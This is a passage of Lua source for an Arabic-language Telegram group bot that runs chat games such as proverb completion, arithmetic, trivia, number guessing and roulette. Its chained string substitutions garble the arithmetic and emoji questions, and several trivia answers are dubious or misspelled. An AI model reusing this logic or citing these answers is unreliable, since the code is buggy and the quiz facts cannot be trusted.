name = string.gsub(name,'👩‍🍳','👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳')
name = string.gsub(name,'🧚‍♀️','🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♀️🧚‍♂️🧚‍♂️')
name = string.gsub(name,'🧚‍♂️','🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♂️🧚‍♀️🧚‍♀️')
name = string.gsub(name,'🧝‍♂️','🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♂️🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♀️')
name = string.gsub(name,'🙍‍♂️','🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️')
name = string.gsub(name,'🧖‍♂️','🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️')
name = string.gsub(name,'👬','👭👭👭👭👬👭👭👭')
name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
name = string.gsub(name,'🕓','🕒🕒🕒🕒🕓🕒🕒🕒')
name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥')
name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⌛️⏳⏳')
name = string.gsub(name,'📅','📆📆📆📆📆📅📆📆')
name = string.gsub(name,'👩‍⚖️','👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👩‍⚖️👨‍⚖️👨‍⚖️')
name = string.gsub(name,'👨‍🎨','👩‍🎨👩‍🎨👨‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨')
TRONTEAM = '⌁︙اول واحد يطلع المختلف يربح\n{'..name..'} '
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md')
return false
end end
if text == DevAbd:get(TRON..'Abd:GameNum4'..msg.chat_id_) and not DevAbd:get(TRON..'Abd:Games:Ids'..msg.chat_id_) then
if not DevAbd:get(TRON..'Abd:Games:Ids'..msg.chat_id_) then 
TRONTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ المختلف للعب مره اخرى'
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md')
DevAbd:incrby(TRON..'Abd:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbd:set(TRON..'Abd:Games:Ids'..msg.chat_id_,true)
end  
if text == 'امثله' and SourceCh(msg) or text == 'الامثله' and SourceCh(msg) then
if not DevAbd:get(TRON..'Abd:Lock:Games'..msg.chat_id_) then
DevAbd2 = {
'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
};
name = DevAbd2[math.random(#DevAbd2)]
DevAbd:set(TRON..'Abd:GameNum5'..msg.chat_id_,name)
DevAbd:del(TRON..'Abd:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'جوز','ينطي ___ للماعنده سنون')
name = string.gsub(name,'ضراطه','الي يسوق المطي يتحمل ___ ')
name = string.gsub(name,'بيدك','اكل ___ محد يفيدك')
name = string.gsub(name,'الحافي','تجدي من ___ نعال')
name = string.gsub(name,'شقره','مع الخيل يا ___ ')
name = string.gsub(name,'النخله','الطول طول ___ والعقل عقل الصخلة')
name = string.gsub(name,'سلايه','بالوجه امراية وبالظهر ___ ')
name = string.gsub(name,'الخيل','من قلة ___ شدو على الچلاب سروج')
name = string.gsub(name,'حداد','موكل من صخم وجهه كال آني ___ ')
name = string.gsub(name,'المبلل',' ___ ما يخاف من المطر')
name = string.gsub(name,'الحبل','اللي تلدغة الحية يخاف من جرة ___ ')
name = string.gsub(name,'يركص','المايعرف ___ يكول الكاع عوجه')
name = string.gsub(name,'العنب','المايلوح ___ يكول حامض')
name = string.gsub(name,'العمه','___ إذا حبت الچنة ابليس يدخل الجنة')
name = string.gsub(name,'الخبز','انطي ___ للخباز حتى لو ياكل نصه')
name = string.gsub(name,'بالحصاد','اسمة ___ ومنجله مكسور')
name = string.gsub(name,'شهر','امشي ___ ولا تعبر نهر')
name = string.gsub(name,'شكه','يامن تعب يامن ___ يا من على الحاضر لكة')
name = string.gsub(name,'القرد',' ___ بعين امه غزال')
name = string.gsub(name,'يكحله','اجه ___ عماها')
TRONTEAM = '⌁︙اكمل المثال التالي ↫ ['..name..']'
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md')
return false
end end
if text == DevAbd:get(TRON..'Abd:GameNum5'..msg.chat_id_) then
if not DevAbd:get(TRON..'Abd:Games:Ids'..msg.chat_id_) then 
DevAbd:incrby(TRON..'Abd:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbd:del(TRON..'Abd:GameNum5'..msg.chat_id_)
TRONTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ امثله للعب مره اخرى'
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md')
end
DevAbd:set(TRON..'Abd:Games:Ids'..msg.chat_id_,true)
end  
if text == 'رياضيات' and SourceCh(msg) or text == 'الرياضيات' and SourceCh(msg) then
if not DevAbd:get(TRON..'Abd:Lock:Games'..msg.chat_id_) then
DevAbd2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
name = DevAbd2[math.random(#DevAbd2)]
DevAbd:set(TRON..'Abd:GameNum6'..msg.chat_id_,name)
DevAbd:del(TRON..'Abd:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'9','7 + 2 = ?')
name = string.gsub(name,'46','41 + 5 = ?')
name = string.gsub(name,'2','5 - 3 = ?')
name = string.gsub(name,'9','5 + 2 + 2 = ?')
name = string.gsub(name,'5','8 - 3 = ?')
name = string.gsub(name,'4','40 ÷ 10 = ?')
name = string.gsub(name,'25','30 - 5 = ?')
name = string.gsub(name,'10','100 ÷ 10 = ?')
name = string.gsub(name,'17','10 + 5 + 2 = ?')
name = string.gsub(name,'15','25 - 10 = ?')
name = string.gsub(name,'39','44 - 5 = ?')
name = string.gsub(name,'5','12 + 1 - 8 = ?')
name = string.gsub(name,'16','16 + 16 - 16 = ?')
TRONTEAM = '⌁︙اكمل المعادله التاليه ↫ ⤈\n{'..name..'} '
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md')
return false
end end
if text == DevAbd:get(TRON..'Abd:GameNum6'..msg.chat_id_) then
if not DevAbd:get(TRON..'Abd:Games:Ids'..msg.chat_id_) then 
DevAbd:incrby(TRON..'Abd:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbd:del(TRON..'Abd:GameNum6'..msg.chat_id_)
TRONTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ رياضيات للعب مره اخرى'
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md')
end
DevAbd:set(TRON..'Abd:Games:Ids'..msg.chat_id_,true)
end  
if text == 'الانكليزي' and SourceCh(msg) or text == 'الانجليزيه' and SourceCh(msg) or text == 'انكليزيه' and SourceCh(msg) then
if not DevAbd:get(TRON..'Abd:Lock:Games'..msg.chat_id_) then
DevAbd2 = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','سدني','نقود','اعلم','ذئب','تمساح','ذكي','شاطئ','غبي',};
name = DevAbd2[math.random(#DevAbd2)]
DevAbd:set(TRON..'Abd:GameNum7'..msg.chat_id_,name)
DevAbd:del(TRON..'Abd:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ذئب','Wolf')
name = string.gsub(name,'معلومات','Information')
name = string.gsub(name,'قنوات','Channels')
name = string.gsub(name,'مجموعات','Groups')
name = string.gsub(name,'كتاب','Book')
name = string.gsub(name,'تفاحه','Apple')
name = string.gsub(name,'نقود','money')
name = string.gsub(name,'اعلم','I know')
name = string.gsub(name,'تمساح','crocodile')
name = string.gsub(name,'شاطئ','Beach')
name = string.gsub(name,'غبي','Stupid')
name = string.gsub(name,'صداقه','Friendchip')
TRONTEAM = '⌁︙ما معنى كلمة ↫ '..name
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md')
return false
end end
if text == DevAbd:get(TRON..'Abd:GameNum7'..msg.chat_id_) then
if not DevAbd:get(TRON..'Abd:Games:Ids'..msg.chat_id_) then 
DevAbd:incrby(TRON..'Abd:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbd:del(TRON..'Abd:GameNum7'..msg.chat_id_)
TRONTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ انكليزيه للعب مره اخرى'
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md')
end
DevAbd:set(TRON..'Abd:Games:Ids'..msg.chat_id_,true)
end  
--     Source TRON     --
if text == 'اسئله' and SourceCh(msg) or text == 'اختيارات' and SourceCh(msg) or text == 'الاسئله' and SourceCh(msg) or text == 'اساله' and SourceCh(msg) then
if not DevAbd:get(TRON..'Abd:Lock:Games'..msg.chat_id_) then
DevAbd2 = {'النيل','14','الفم','11','30','بوتين','ستيف جوبر','باريس','10','النمل','حرف الواو','الشعر','سحاب','الاسم','ذهب','حرف الام','العزائم','انسات','المنجنيق','اسيا','6','الاسد','مهر','الدولفين','اوروبا','الزئبق','لندن','الانسان','طوكيو','خديجه',}
name = DevAbd2[math.random(#DevAbd2)]
DevAbd:set(TRON..'Abd:GameNum8'..msg.chat_id_,name)
DevAbd:del(TRON..'Abd:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'النيل','⌁︙ماهو اطول نهر في العالم ؟\n1- النيل\n2- الفرات\n3- نهر الكونغو')
name = string.gsub(name,'14','⌁︙ماعدد عظام الوجه ؟\n1- 15\n2- 13\n3- 14')
name = string.gsub(name,'الفم','⌁︙كراسي بيضاء وجدران ورديه اذا اغلقته اصبح ظلام  فمن اكون ؟\n1- الفم\n2- الاذن\n3- الثلاجه')
name = string.gsub(name,'11','⌁︙كم جزء يحتوي مسلسل وادي الذئاب ؟\n1- 7\n2- 15\n3- 11')
name = string.gsub(name,'30','⌁︙كم جزء يحتوي القران الكريم ؟\n1- 60\n2- 70\n3- 30')
name = string.gsub(name,'بوتين','⌁︙من هوه اغنى رئيس في العالم ؟\n1- ترامب\n2- اوباما\n3- بوتين')
name = string.gsub(name,'ستيف جوبر','⌁︙من هوه مؤسس شركه ابل العالميه  ؟\n1- لاري بايج\n2- بيل جيتس\n3- ستيف جوبر')
name = string.gsub(name,'باريس','ماهي عاصمه فرنسا ؟\n1- باريس\n2- لوين\n3- موسكو')
name = string.gsub(name,'10','⌁︙ماعدد دول العربيه التي توجد في افريقيا ؟\n1- 10\n2- 17\n3- 9')
name = string.gsub(name,'النمل','⌁︙ماهو الحيوان الذي يحمل 50 فوق وزنه ؟\n1- الفيل\n2- النمل\n3- الثور')
name = string.gsub(name,'حرف الواو','⌁︙ماذا يوجد بيني وبينك ؟\n1- الضل\n2- الاخلاق\n3- حرف الواو')
name = string.gsub(name,'الشعر','⌁︙ماهو الشيء النبات ينبت للانسان بلا بذر ؟\n1- الاضافر\n2- الاسنان\n3- الشعر')
name = string.gsub(name,'سحاب','⌁︙ما هو الشّيء الذي يستطيع المشي بدون أرجل والبكاء بدون أعين ؟\n1- سحاب\n2- بئر\n3- نهر')
name = string.gsub(name,'الاسم','⌁︙ما الشيء الذي نمتلكه , لكنّ غيرنا يستعمله أكثر منّا ؟\n1- العمر\n2- ساعه\n3- الاسم')
name = string.gsub(name,'ذهب','⌁︙اصفر اللون سارق عقول اهل الكون وحارمهم لذيذ النوم ؟\n1- نحاس\n2- الماس\n3- ذهب')
name = string.gsub(name,'حرف الام','⌁︙في الليل ثلاثة لكنه في النهار واحده فما هو ؟\n1- حرف الباء\n2- حرف الام\n3- حرف الراء')
name = string.gsub(name,'العزائم','⌁︙على قدر اصل العزم تأتي ؟\n1- العزائم\n2- المكارم\n3- المبائب')
name = string.gsub(name,'انسات','⌁︙ماهي جمع كلمه انسه ؟\n1- سيدات\n2- انسات\n3- قوانص')
name = string.gsub(name,'المنجنيق','⌁︙اله اتسعلمت قديما في الحروب ؟\n1- الصاروخ\n2- المسدس\n3- المنجنيق')
name = string.gsub(name,'اسيا','⌁︙تقع لبنان في قاره ؟\n1- افريقيا\n2- اسيا\n3- امركيا الشماليه')
name = string.gsub(name,'6','⌁︙كم صفرا للمليون ؟\n1- 4\n2- 3\n3- 6')
name = string.gsub(name,'الاسد','⌁︙ماهو الحيوان الذي يلقب بملك الغابه ؟\n1- الفيل\n2- الاسد\n3- النمر')
name = string.gsub(name,'مهر','⌁︙ما اسم صغير الحصان ؟\n1- مهر\n2- جرو\n3- عجل')
name = string.gsub(name,'الدولفين','⌁︙ما الحيوان الذي ينام واحدى عينه مفتوحه ؟\n1- القرش\n2- الدولفين\n3- الثعلب\n')
name = string.gsub(name,'اوروبا','⌁︙ماهي القاره التي تلقب بالقاره العجوز ؟\n1- اوروبا\n2- امريكا الشماليه\n3- افريقيا')
name = string.gsub(name,'الزئبق','⌁︙ما اسم المعدن الموجود فيي الحاله السائله ؟\n1- النحاس\n2- الحديد\n3- الزئبق')
name = string.gsub(name,'لندن','⌁︙ماهي عاصمه انجلترا ؟\n1- لندن\n2- لفرسول\n3- تركيا')
name = string.gsub(name,'الانسان','⌁︙ماهو الشئ الذي برأسه سبع فتحات ؟\n1- الهاتف\n2- التلفاز\n3- الانسان')
name = string.gsub(name,'طوكيو','⌁︙ماهي عاصمه اليابان ؟\n1- بانكول\n2- نيو دلهي\n3- طوكيو')
name = string.gsub(name,'خديجه','⌁︙من هي زوجه الرسول الاكبر منه سنآ ؟\n1- حفضه\n2- زينب\n3- خديجه')
TRONTEAM = name..'\n⌁︙ارسل الجواب الصحيح فقط'
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md')
return false
end end
if text == DevAbd:get(TRON..'Abd:GameNum8'..msg.chat_id_) then
if not DevAbd:get(TRON..'Abd:Games:Ids'..msg.chat_id_) then 
DevAbd:incrby(TRON..'Abd:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbd:del(TRON..'Abd:GameNum8'..msg.chat_id_)
TRONTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ الاسئله للعب مره اخرى'
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md')
end
DevAbd:set(TRON..'Abd:Games:Ids'..msg.chat_id_,true)
end  
--     Source TRON     --
if DevAbd:get(TRON.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_Abd(msg.chat_id_, msg.id_, 1,"⌁︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = DevAbd:get(TRON.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevAbd:del(TRON..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevAbd:del(TRON.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
DevAbd:incrby(TRON..'Abd:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙*التخمين الصحيح هو* ↫ '..NUM..'\n⌁︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevAbd:incrby(TRON..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(DevAbd:get(TRON..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
DevAbd:del(TRON..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevAbd:del(TRON.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙*التخمين الصحيح هو* ↫ '..GETNUM..'\n⌁︙*للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
else
if tonumber(DevAbd:get(TRON..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(DevAbd:get(TRON..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
SetNum = 'محاوله واحده فقط'
end
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙لقد خمنت الرقم الخطا وتبقى لديك '..SetNum..' ارسل رقم تخمنه مره اخرى للفوز', 1, 'md')
end
end
end
end
if text == 'خمن' and SourceCh(msg) or text == 'تخمين' and SourceCh(msg) then   
if not DevAbd:get(TRON..'Abd:Lock:Games'..msg.chat_id_) then
Num = math.random(1,20)
DevAbd:set(TRON.."GAMES:NUM"..msg.chat_id_,Num) 
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙اهلا بك عزيزي في لعبة التخمين ↫ ⤈\n ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n⌁︙ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
DevAbd:setex(TRON.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_, 100, true)  
return false  
end
end
--     Source TRON     --
if text == 'روليت' then
if not DevAbd:get(TRON..'Abd:Lock:Games'..msg.chat_id_) then
DevAbd:del(TRON.."Abd:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevAbd:del(TRON..'Abd:ListRolet'..msg.chat_id_)  
DevAbd:setex(TRON.."Abd:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙حسنا لنلعب , ارسل عدد اللاعبين للروليت .', 1, 'md')
return false  
end
end
if text and text:match("^(%d+)$") and DevAbd:get(TRON.."Abd:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "⌁︙لا استطيع بدء اللعبه بلاعب واحد فقط"
else
DevAbd:set(TRON.."Abd:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = '⌁︙تم بدء تسجيل اللسته يرجى ارسال المعرفات \n⌁︙الفائز يحصل على 5 نقاط عدد المطلوبين ↫ '..text..' لاعب'
end
DevAbd:del(TRON.."Abd:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text and text:match('^(@[%a%d_]+)$') and DevAbd:get(TRON.."Abd:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if DevAbd:sismember(TRON..'Abd:ListRolet'..msg.chat_id_,text) then
send(msg.chat_id_,msg.id_,'⌁︙المعرف ↫ ['..text..'] موجود اساسا')
return false
end
tdcli_function ({ID = "SearchPublicChat",username_ = text},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙المعرف غير صحيح يرجى ارسال معرف صحيح', 1, 'md')
return false 
end
DevAbd:sadd(TRON..'Abd:ListRolet'..msg.chat_id_,text)
local CountAdd = DevAbd:get(TRON.."Abd:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = DevAbd:scard(TRON..'Abd:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
DevAbd:del(TRON.."Abd:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevAbd:setex(TRON.."Abd:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
local Text = "⌁︙تم ادخال المعرف ↫ ["..text.."]\n⌁︙وتم اكتمال العدد الكلي هل انت مستعد ؟"
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="لا",callback_data="/NoRolet"}},{{text="اللاعبين",callback_data="/ListRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
local Text = "⌁︙تم ادخال المعرف ↫ ["..text.."] وتبقى ↫ "..CountUser.." لاعبين ليكتمل العدد ارسل المعرف الاخر"
keyboard = {} 
keyboard.inline_keyboard = {{{text="الغاء",callback_data="/NoRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil) 
end
--     Source TRON     --
if text == 'كت تويت' and SourceCh(msg) or text == 'كت' and SourceCh(msg) then
if not DevAbd:get(TRON..'Abd:Lock:Games'..msg.chat_id_) then
local TRONTEAM = {
'آخر مرة زرت مدينة الملاهي؟','آخر مرة أكلت أكلتك المفضّلة؟','الوضع الحالي؟\n‏1. سهران\n‏2. ضايج\n‏3. أتأمل','آخر شيء ضاع منك؟','كلمة أخيرة لشاغل البال؟','طريقتك المعتادة في التخلّص من الطاقة السلبية؟','شهر من أشهر العام له ذكرى جميلة معك؟','كلمة غريبة من لهجتك ومعناها؟🤓','‏- شيء سمعته عالق في ذهنك هاليومين؟','متى تكره الشخص الذي أمامك حتى لو كنت مِن أشد معجبينه؟','‏- أبرز صفة حسنة في صديقك المقرب؟','هل تشعر أن هنالك مَن يُحبك؟','اذا اكتشفت أن أعز أصدقائك يضمر لك السوء، موقفك الصريح؟','أجمل شيء حصل معك خلال هاليوم؟','صِف شعورك وأنت تُحب شخص يُحب غيرك؟👀💔','كلمة لشخص غالي اشتقت إليه؟💕','آخر خبر سعيد، متى وصلك؟','أنا آسف على ....؟','أوصف نفسك بكلمة؟','صريح، مشتاق؟','‏- صريح، هل سبق وخذلت أحدهم ولو عن غير قصد؟','‏- ماذا ستختار من الكلمات لتعبر لنا عن حياتك التي عشتها الى الآن؟💭','‏- فنان/ة تود لو يدعوكَ على مائدة عشاء؟😁❤','‏- تخيّل شيء قد يحدث في المستقبل؟','‏- للشباب | آخر مرة وصلك غزل من فتاة؟🌚','شخص أو صاحب عوضك ونساك مُر الحياة ما اسمه ؟','| اذا شفت حد واعجبك وعندك الجرأه انك تروح وتتعرف عليه ، مقدمة الحديث شو راح تكون ؟.','كم مره تسبح باليوم','نسبة النعاس عندك حاليًا؟','لو فقط مسموح شخص واحد تتابعه فالسناب مين بيكون ؟','يهمك ملابسك تكون ماركة ؟','وش الشيء الي تطلع حرتك فيه و زعلت ؟','عندك أخوان او خوات من الرضاعة؟','عندك معجبين ولا محد درا عنك؟',
'أطول مدة قضيتها بعيد عن أهلك ؟','لو يجي عيد ميلادك تتوقع يجيك هدية؟','يبان عليك الحزن من " صوتك - ملامحك','وين تشوف نفسك بعد سنتين؟','وش يقولون لك لما تغني ؟','عندك حس فكاهي ولا نفسية؟','كيف تتصرف مع الشخص الفضولي ؟','كيف هي أحوال قلبك؟','حاجة تشوف نفسك مبدع فيها ؟','متى حبيت؟','شيء كل م تذكرته تبتسم ...','العلاقه السريه دايماً تكون حلوه؟','صوت مغني م تحبه','لو يجي عيد ميلادك تتوقع يجيك هدية؟','اذا احد سألك عن شيء م تعرفه تقول م اعرف ولا تتفلسف ؟','مع او ضد : النوم افضل حل لـ مشاكل الحياة؟','مساحة فارغة (..............) اكتب اي شيء تبين','اغرب اسم مر عليك ؟','عمرك كلمت فويس احد غير جنسك؟','اذا غلطت وعرفت انك غلطان تحب تعترف ولا تجحد؟','لو عندك فلوس وش السيارة اللي بتشتريها؟','وش اغبى شيء سويته ؟','شيء من صغرك ماتغير فيك؟','وش نوع الأفلام اللي تحب تتابعه؟','وش نوع الأفلام اللي تحب تتابعه؟','تجامل احد على حساب مصلحتك ؟','تتقبل النصيحة من اي شخص؟','كلمه ماسكه معك الفترة هذي ؟','متى لازم تقول لا ؟','اكثر شيء تحس انه مات ف مجتمعنا؟','تؤمن ان في "حُب من أول نظرة" ولا لا ؟.','تؤمن ان في "حُب من أول نظرة" ولا لا ؟.','هل تعتقد أن هنالك من يراقبك بشغف؟','اشياء اذا سويتها لشخص تدل على انك تحبه كثير ؟','اشياء صعب تتقبلها بسرعه ؟','اقتباس لطيف؟','أكثر جملة أثرت بك في حياتك؟','عندك فوبيا من شيء ؟.',
'اكثر لونين تحبهم مع بعض؟','أجمل بيت شعر سمعته ...','سبق وراودك شعور أنك لم تعد تعرف نفسك؟','تتوقع فيه احد حاقد عليك ويكرهك ؟','أجمل سنة ميلادية مرت عليك ؟','لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين؟','وش تحس انك تحتاج الفترة هاذي ؟','يومك ضاع على؟','@منشن .. شخص تخاف منه اذا عصب ...','فيلم عالق في ذهنك لا تنساه مِن روعته؟','تختار أن تكون غبي أو قبيح؟','الفلوس او الحب ؟','أجمل بلد في قارة آسيا بنظرك؟','ما الذي يشغل بالك في الفترة الحالية؟','احقر الناس هو من ...','وين نلقى السعاده برايك؟','اشياء تفتخر انك م سويتها ؟','تزعلك الدنيا ويرضيك ؟','وش الحب بنظرك؟','افضل هديه ممكن تناسبك؟','كم في حسابك البنكي ؟','كلمة لشخص أسعدك رغم حزنك في يومٍ من الأيام ؟','عمرك انتقمت من أحد ؟!','ما السيء في هذه الحياة ؟','غنية عندك معاها ذكريات🎵🎻','/','أفضل صفة تحبه بنفسك؟','اكثر وقت تحب تنام فيه ...','أطول مدة نمت فيها كم ساعة؟','أصعب قرار ممكن تتخذه ؟','أفضل صفة تحبه بنفسك؟','اكثر وقت تحب تنام فيه ...','أنت محبوب بين الناس؟ ولاكريه؟','إحساسك في هاللحظة؟','اخر شيء اكلته ؟','تشوف الغيره انانيه او حب؟','اذكر موقف ماتنساه بعمرك؟','اكثر مشاكلك بسبب ؟','اول ماتصحى من النوم مين تكلمه؟','آخر مرة ضحكت من كل قلبك؟','لو الجنسية حسب ملامحك وش بتكون جنسيتك؟','اكثر شيء يرفع ضغطك','اذكر موقف ماتنساه بعمرك؟','لو قالوا لك  تناول صنف واحد فقط من الطعام لمدة شهر .',
'كيف تشوف الجيل ذا؟','ردة فعلك لو مزح معك شخص م تعرفه ؟','احقر الناس هو من ...','تحب ابوك ولا امك','آخر فيلم مسلسل والتقييم🎥؟','أقبح القبحين في العلاقة: الغدر أو الإهمال🤷🏼؟','كلمة لأقرب شخص لقلبك🤍؟','حط@منشن لشخص وقوله "حركتك مالها داعي"😼!','اذا جاك خبر مفرح اول واحد تعلمه فيه مين💃🏽؟','طبع يمكن يخليك تكره شخص حتى لو كنت تُحبه🙅🏻‍♀️؟','افضل ايام الاسبوع عندك🔖؟','يقولون ان الحياة دروس ، ماهو أقوى درس تعلمته من الحياة🏙؟','تاريخ لن تنساه📅؟','تحب الصيف والا الشتاء❄️☀️؟','شخص تحب تستفزه😈؟','شنو ينادونك وانت صغير (عيارتك)👼🏻؟','عقل يفهمك/ج ولا قلب يحبك/ج❤️؟','اول سفره لك وين رح تكون✈️؟','كم عدد اللي معطيهم بلوك👹؟','نوعية من الأشخاص تتجنبهم في حياتك❌؟','شاركنا صورة او فيديو من تصويرك؟📸','كم من عشره تعطي حظك📩؟','اكثر برنامج تواصل اجتماعي تحبه😎؟','من اي دوله انت🌍؟','اكثر دوله ودك تسافر لها🏞؟','مقولة "نكبر وننسى" هل تؤمن بصحتها🧓🏼؟','تعتقد فيه أحد يراقبك👩🏼‍💻؟','لو بيدك تغير الزمن ، تقدمه ولا ترجعه🕰؟','مشروبك المفضل🍹؟','‏قم بلصق آخر اقتباس نسخته؟💭','كم وزنك/ج طولك/ج؟🌚','كم كان عمرك/ج قبل ٨ سنين😈؟','دوله ندمت انك سافرت لها😁؟','لو قالو لك ٣ أمنيات راح تتحقق عالسريع شنو تكون🧞‍♀️؟','‏- نسبة احتياجك للعزلة من 10📊؟','شخص تحبه حظرك بدون سبب واضح، ردة فعلك🧐؟','مبدأ في الحياة تعتمد عليه دائما🕯؟'
}  
Dev_Abd(msg.chat_id_, msg.id_, 1, ''..TRONTEAM[math.random(#TRONTEAM)]..'' , 1, 'md')  
return false
end
end
--     Source TRON     --
if text and (text == 'الالعاب' or text == 'العاب' or text == 'اللعبه') and SourceCh(msg) then
if not DevAbd:get(TRON..'Abd:Lock:Games'..msg.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1,[[
⌁︙قائمة العاب المجموعه ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙لعبة التخمين ↫ خمن
⌁︙لعبة الامثله ↫ امثله
⌁︙لعبة العكس ↫ العكس
⌁︙لعبة الاسئله ↫ اسئله
⌁︙لعبة الروليت ↫ روليت
⌁︙لعبة الحزوره ↫ حزوره
⌁︙لعبة الترتيب ↫ ترتيب
⌁︙لعبة المعاني ↫ معاني
⌁︙لعبة التويت ↫ كت تويت
⌁︙لعبة المختلف ↫ المختلف
⌁︙لعبة السمايلات ↫ سمايلات
⌁︙لعبة المحيبس ↫ المحيبس
